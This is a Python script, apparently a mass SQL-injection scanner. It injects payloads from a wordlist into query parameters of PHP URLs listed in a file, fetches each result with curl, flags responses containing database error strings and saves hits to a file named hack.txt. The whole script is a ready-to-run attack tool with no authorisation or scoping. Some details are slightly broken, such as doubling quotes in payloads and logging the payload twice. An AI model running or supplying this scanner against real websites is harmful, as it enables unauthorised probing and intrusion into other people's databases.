import re
import subprocess
import time
from termcolor import colored
import requests
import chardet

# Read the list of URLs to test from a file
with open("urls.txt", "rb") as f:
    raw_data = f.read()
    result = chardet.detect(raw_data)
    encoding = result["encoding"]

with open("urls.txt", "r", encoding=encoding) as f:
    urls = [line.strip() for line in f.readlines()]

# Define SQL errors
sql_errors = ["Syntax error", "Fatal error", "MariaDB", "corresponds", "Database Error", "syntax", "/home/", "/usr/www", "occured", "public_html", "database error", "on line", "RuntimeException", "mysql_", "Warning", "MySQL", "PSQLException", "at line", "You have an error in your SQL syntax", "mysql_query()", "pg_connect()"]

# Define list of words to filter URLs
filter_words = ["id=", "select=", "report=", "artist=", "ID=", "searchfor=", "item=", "search=", "message_id=", "follower_id=", "user_agent=", "cookie=", "referer=", "document_id=", "post_id=", "comment_id=", "event_id=", "booking_id=", "ticket_id=", "track_id=", "image_id=", "invoice_id=", "subscription_id=", "feedback=", "category_id=", "order_id=", "transaction_id=", "country=", "zipcode=", "product_id=", "redirect=", "callback=", "action=", "avg=", "insert_into=", "values=", "address=", "user_id=", "search_term=", "filter_by=", "group_by=", "union=", "offset=", "grad=", "kat=", "role=", "update=", "query=", "user=", "name=", "sort=", "where=", "search=", "params=", "process=", "row=", "view=", "table=", "from=", "sel=", "results=", "sleep=", "fetch=", "order=", "keyword=", "column=", "field=", "delete=", "string=", "number=", "filter="]

# Set the list of payloads to test
with open("sql_wordlist.txt", "r") as f:
    payloads = [line.strip() for line in f.readlines()]

# Iterate through each URL and payload
vulnerable_urls = []
total_requests = len(urls) * len(payloads)
progress = 0
start_time = time.time()

for url in urls:
    # Check if URL contains ".php" and any filter word
    if ".php" in url and any(filter_word in url for filter_word in filter_words):
        for payload in payloads:
            try:
                # Escape single quotes in the payload
                payload = payload.replace("'", "''")

                # Find the filter word in the URL and inject the payload
                for filter_word in filter_words:
                    if filter_word in url:
                        index = url.find(filter_word)
                        end_index = url.find('&', index)
                        if end_index == -1:
                            end_index = len(url)
                        modified_url = url[:index + len(filter_word)] + payload + url[end_index:]

                        # Test new URL and get source code
                        command = ['curl', '-s', '-i', '--url', modified_url]
                        output_bytes = subprocess.check_output(command, stderr=subprocess.DEVNULL)
                        output_str = output_bytes.decode('utf-8', errors='ignore')

                        # Check for SQL errors and print message if found
                        sql_matches = [error for error in sql_errors if error in output_str]
                        if sql_matches:
                            message = f"\n{colored('SQL ERROR FOUND', 'white')} ON {colored(modified_url, 'red', attrs=['bold'])} with payload {colored(payload, 'white')}"
                            with open('sql_errors.txt', 'a') as file:
                                file.write(modified_url + payload + '\n')
                            for match in sql_matches:
                                print(colored(" Match Words: " + match, 'cyan'))
                            print(message)
                            vulnerable_urls.append(modified_url)
                        else:
                            # Print safe URLs in green text
                            print(colored(f"{modified_url} safe", 'green'))

                        # Update progress and calculate estimated remaining time
                        progress += 1
                        percent_complete = round(progress / total_requests * 100, 2)
                        remaining_requests = total_requests - progress
                        remaining_time = remaining_requests * (time.time() - start_time) / progress
                        remaining_hours = int(remaining_time // 3600)
                        remaining_minutes = int((remaining_time % 3600) // 60)

                        # Print progress update
                        print(f"{colored('Progress:', 'blue')} {progress}/{total_requests} ({percent_complete}%) - {remaining_hours}h:{remaining_minutes:02d}m")

            except subprocess.CalledProcessError:
                pass

            except Exception as e:
                print(f"An error occurred: {e}. Saving vulnerable URLs to file...")
                break

# Save vulnerable URLs to file
with open("hack.txt", "w") as f:
    for url in vulnerable_urls:
        f.write(url + "\n")

print("Vulnerable URLs saved to file.")
